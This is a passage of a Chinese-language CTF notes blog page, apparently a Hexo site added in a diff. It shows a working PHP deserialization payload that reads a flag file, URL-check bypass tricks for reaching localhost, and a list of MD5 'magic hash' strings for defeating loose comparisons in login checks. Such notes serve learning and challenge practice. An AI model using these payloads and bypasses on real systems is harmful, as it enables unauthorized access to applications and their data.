class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>设计序列的方法，把上面的类复制到可以运行php代码的编译器中，根据其中的要求创建，代码如下所示：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$correct</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$input</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;correct = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">uniqid</span>());</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;correct === <span class="variable language_">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">BUU</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;input=&amp;<span class="variable">$a</span>-&gt;correct;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;BUU&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;correct&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;input&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>于是在POST中传递obj&#x3D;O:3:”BUU”:2:{s:7:”correct”;s:0:””;s:5:”input”;R:2;}即可。</p>
+<h3 id="url访问绕过"><a href="#url访问绕过" class="headerlink" title="url访问绕过"></a>url访问绕过</h3><p>当题目中出现类似strpos的函数要求访问地址包含某个IP地址时，可以通过一定的方法进行绕过</p>
+<h4 id="的使用"><a href="#的使用" class="headerlink" title="@的使用"></a>@的使用</h4><p>浏览器会把<a target="_blank" rel="noopener" href="https://wtj4nq.github.io@www.github.com解析成github的网址./">https://wtj4nq.github.io@www.github.com解析成github的网址。</a></p>
+<h4 id="特殊0"><a href="#特殊0" class="headerlink" title="特殊0"></a>特殊0</h4><p>在Windows中，0被解析为地址0.0.0.0，而在linux中，0被解析为127.0.0.1</p>
+<h4 id="省略0"><a href="#省略0" class="headerlink" title="省略0"></a>省略0</h4><p>正如IPv6地址的省略方法一样，访问时可以省略中间的0，如访问127.1和访问127.0.0.1是一样的。</p>
+<h3 id="MD5弱碰撞"><a href="#MD5弱碰撞" class="headerlink" title="MD5弱碰撞"></a>MD5弱碰撞</h3><p>PHP在处理哈希字符串时，会利用”!&#x3D;”或”&#x3D;&#x3D;”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。</p>
+<p>以下是一些0e开头的字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br></pre></td></tr></table></figure>
+
+	</div>
+</article>
+
+
+
+    </div>
+  </div>
+  <div class="row">
+<div id="bottom" class="col-md-12"> 
+  <div class="bottom-nav">
+	
+	
+	<a href="https://github.com/lizehongss" class="fa fa-github fa-2x" target="_blank" title="Follow me" ></a>
+	
+	
+</div>
+<div class="bottom-info">
+	&copy; 2025 Liangyu Chen<br>
+	Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+	theme <a href="https://github.com/lizehongss/hexo-theme-zhl" target="_blank">zhl</a>
+</div>
+</div>
+</div>
+</div>
+<div id="tool">
+  <ul>
+    <li class="fa fa-angle-up top" id="top"></li>
+  </ul>
+</div>
+  <div class="bg_content">
+    <canvas id="canvas"></canvas>
+  </div>
+  
+  <!-- scripts list from theme config.yml -->
+  
+    <script src="/js/zhl.js"></script>
+  
+    <script src="/js/bj.js"></script>
+  
+
+<!-- jQ cdn  -->
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<!-- bootstrap js cdn-->
+<!-- <script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script> -->
+
+
+</body>
+</html>
